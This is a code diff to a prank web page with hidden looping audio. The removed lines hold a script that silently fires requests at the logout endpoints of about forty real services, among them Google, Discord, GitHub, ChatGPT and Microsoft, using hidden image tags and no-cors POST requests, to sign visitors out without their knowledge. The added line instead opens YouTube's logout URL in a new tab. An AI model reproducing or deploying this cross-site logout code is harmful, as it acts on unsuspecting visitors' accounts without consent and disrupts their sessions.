@@ -73,71 +73,9 @@
     <audio id="idiotSound" src="GAGAGA.mp3" loop hidden></audio>
 
     <script>
-        const logoutServices = {
-  Discord: ['POST', 'https://discord.com/api/v9/auth/logout', {provider: null, voip_provider: null}],
-  Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
-  DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
-  Dropbox: ['GET', 'https://www.dropbox.com/logout'],
-  eBay: ['GET', 'https://signin.ebay.com/ws/eBayISAPI.dll?SignIn'],
-  GitHub: ['GET', 'https://github.com/logout'],
-  GMail: ['GET', 'https://mail.google.com/mail/?logout'],
-  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
-  Hulu: ['GET', 'https://secure.hulu.com/logout'],
-  NetFlix: ['GET', 'https://www.netflix.com/Logout'],
-  Skype: ['GET', 'https://secure.skype.com/account/logout'],
-  SoundCloud: ['GET', 'https://soundcloud.com/logout'],
-  'Steam Community': ['GET', 'https://steamcommunity.com/?action=doLogout'],
-  'Steam Store': ['GET', 'https://store.steampowered.com/logout/'],
-  Wikipedia: ['GET', 'https://en.wikipedia.org/w/index.php?title=Special:UserLogout'],
-  'Windows Live': ['GET', 'https://login.live.com/logout.srf'],
-  Wordpress: ['GET', 'https://wordpress.com/wp-login.php?action=logout'],
-  Yahoo: ['GET', 'https://login.yahoo.com/config/login?.src=fpctx&logout=1&.direct=1&.done=https://www.yahoo.com/'],
-  YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }],
-  JShop: ['GET', 'https://jshop.partners/panel/logout'],
-  Vimeo: ['GET', 'https://vimeo.com/log_out'], // added by @intexpression
-  Tumblr: ['GET', 'https://www.tumblr.com/logout'], // added by @intexpression
-  Allegro: ['GET', 'https://allegro.pl/wyloguj?origin_url=/'], // added by @intexpression
-  OnetMail: ['GET', 'https://authorisation.grupaonet.pl/logout.html?state=logout&client_id=poczta.onet.pl.front.onetapi.pl'], // added by @intexpression
-  InteriaMail: ['GET', 'https://poczta.interia.pl/logowanie/sso/logout'], // added by @intexpression
-  OLX: ['GET', 'https://www.olx.pl/account/logout'], // added by @intexpression
-  Roblox:  ['POST', 'https://auth.roblox.com/v2/logout'], // added by @cryblanka
-  ChatGPT: ['GET', 'https://chatgpt.com/auth/logout'], // added by @cryblanka
-  Guilded:  ['POST', 'https://www.guilded.gg/api/logout'], // added by @cryblanka
-  LinkedIn: ['GET', 'https://www.linkedin.com/m/logout/'], // added by @MARECKIyt
-  Pinterest: ['GET', 'https://www.pinterest.com/logout/'], // added by @MARECKIyt
-  Reddit: ['GET', 'https://www.reddit.com/logout'], // added by @MARECKIyt
-  Spotify: ['GET', 'https://www.spotify.com/logout/'], // added by @MARECKIyt
-  Microsoft: ['GET', 'https://login.microsoftonline.com/common/oauth2/logout'], // added by @MARECKIyt
-  Instagram: ['GET', 'https://www.instagram.com/accounts/logout/'], // added by @MARECKIyt
-  Trello: ['GET', 'https://trello.com/logout'], // added by @MARECKIyt
-  Baidu: ['GET', 'https://passport.baidu.com/?logout'], // added by @MARECKIyt
-  VK: ['GET', 'https://vk.com/exit'], // added by @MARECKIyt
-  StackOverflow: ['GET', 'https://stackoverflow.com/users/logout'], // added by @MARECKIyt
-  Asana: ['POST', 'https://app.asana.com/app/asana/-/logout'], // added by @Hyd3r1
-        };
         
-        function attemptLogoutFromAll() {
-          for (const serviceName in logoutServices) {
-            const [method, url, payload] = logoutServices[serviceName];
-            
-            if (method === 'GET') {
-              const img = document.createElement('img');
-              img.src = url;
-              img.style.display = 'none';
-              document.body.appendChild(img);
-            } 
-            else if (method === 'POST') {
-              fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(payload),
-                mode: 'no-cors',
-                credentials: 'omit'
-              });
-            }
-          }
-        }
-
+        const redirectUrl = 'https://www.youtube.com/logout'; 
+        
         const startScreen = document.getElementById('start-screen');
         const mainContent = document.getElementById('main-content');
         const audio = document.getElementById('idiotSound');
@@ -157,9 +95,7 @@
         }
         
         function revealContent() {
-            attemptLogoutFromAll();
-
-            window.open('', '_blank'); 
+            window.open(redirectUrl, '_blank'); 
 
             startScreen.style.display = 'none';
             mainContent.style.display = 'block';
